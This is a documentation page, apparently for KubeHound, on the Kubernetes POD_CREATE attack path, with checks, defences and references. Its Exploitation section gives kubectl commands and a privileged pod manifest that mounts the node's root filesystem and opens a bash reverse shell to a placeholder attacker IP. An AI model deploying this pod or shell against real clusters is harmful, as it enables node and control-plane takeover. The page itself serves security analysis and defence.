---
title: POD_CREATE
---

<!--
id: POD_CREATE
name: "Create privileged pod"
mitreAttackTechnique: T1610 - Deploy Container
mitreAttackTactic: TA0002 - Execution
-->

# POD_CREATE

Create a pod with significant privilege (`CAP_SYSADMIN`, `hostPath=/`, etc) and schedule on a target node via setting the `nodeName` selector.

| Source                                        | Destination                 | MITRE                                                                                    |
| --------------------------------------------- | --------------------------- | ---------------------------------------------------------------------------------------- |
| [PermissionSet](../entities/permissionset.md) | [Node](../entities/node.md) | [Container Orchestration Job, T1053.007](https://attack.mitre.org/techniques/T1053/007/) |

## Details

Given the rights to create a new pod, an attacker can create a deliberately overprivileged pod within the cluster. This will grant the attacker full control over the node on which the pod is scheduled (via any number of container escape techniques). Additionally by setting the `nodeName` selector in the pod spec to the control plane node, the attacker can gain root access to the control plane node and take over the entire cluster!

## Prerequisites

A role granting permission to create pods.

## Checks

Check whether the current account has the ability to create pods, for example using kubectl:

```bash
kubectl auth can-i create pod
```

## Exploitation

Identify the name of the target (e.g control plane) node via:

```bash
kubectl get nodes -o wide --all-namespaces | grep control-plane
```

Create a pod spec for our attack pod (N.B. If your target node is a control plane one you may need to add a [toleration](https://kubernetes.io/docs/concepts/scheduling-eviction/taint-and-toleration/) to this manifest to allow it to be scheduled):

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: control-plane-attack
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: control-plane-attack
    image: ubuntu
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1" ]
  nodeName: < TARGET NODE NAME > 
  volumes:
  - name: noderoot
    hostPath:
      path: /
```

Create the pod via kubectl:

```bash
kubebctl apply -f control-plane-pod-spec.yaml
```

## Defences

### Monitoring

+ Monitor for pod creation from within an existing pod 
+ Monitor privileged pod creation with suspicious command arguments

### Implement security policies

Use a pod security policy or admission controller to prevent or limit the creation of pods with additional powerful capabilities.

## Calculation

+ [PodCreate](https://github.com/DataDog/KubeHound/tree/main/pkg/kubehound/graph/edge/pod_create.go)

## References:

+ [The Path Less Traveled: Abusing Kubernetes Defaults (Video)](https://www.youtube.com/watch?v=HmoVSmTIOxM)
+ [The Path Less Traveled: Abusing Kubernetes Defaults (GitHub)](https://github.com/mauilion/blackhat-2019)
+ [Bad Pods](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod1)
